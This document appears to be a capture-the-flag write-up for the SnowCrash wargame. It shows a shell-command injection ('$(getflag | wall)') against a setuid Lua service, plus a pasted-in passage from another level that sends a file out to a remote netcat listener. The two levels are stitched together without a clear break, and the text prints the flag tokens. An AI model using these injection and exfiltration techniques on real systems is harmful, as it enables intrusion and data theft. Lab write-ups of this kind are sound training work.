when we enter we see a single executable with s permits 

```bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile

```

Checking that lua exec

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

that hash is a decoy the real thing is code injection. with nc

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag | wall)
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 23:44 ...                                               
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                               
Erf nope..

```

with a base file that is harmless. In a remote window run a listener 
(nc -lvnp 6969) Then in the snow-crash machine in another terminal run 


```bash
./level10 victim.txt 192.168.0.4

```

note you may need to reset the listener and run the code multiple times. 
You may get 

1. Don't have access to file
2. The harmless file sent
3. The token sent

Repeat until you have the desired result


```bash
andres@andres-System-Product-Name:~$ nc -lvnp 6969
Listening on 0.0.0.0 6969
Connection received on 192.168.0.43 42326
.*( )*.
hola
andres@andres-System-Product-Name:~$ nc -lvnp 6969
Listening on 0.0.0.0 6969
Connection received on 192.168.0.43 47442
.*( )*.
hola
andres@andres-System-Product-Name:~$ nc -lvnp 6969
Listening on 0.0.0.0 6969
Connection received on 192.168.0.43 60888
.*( )*.
woupa2yuojeeaaed06riuj63c
```

using this to get the real flag

```bash
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```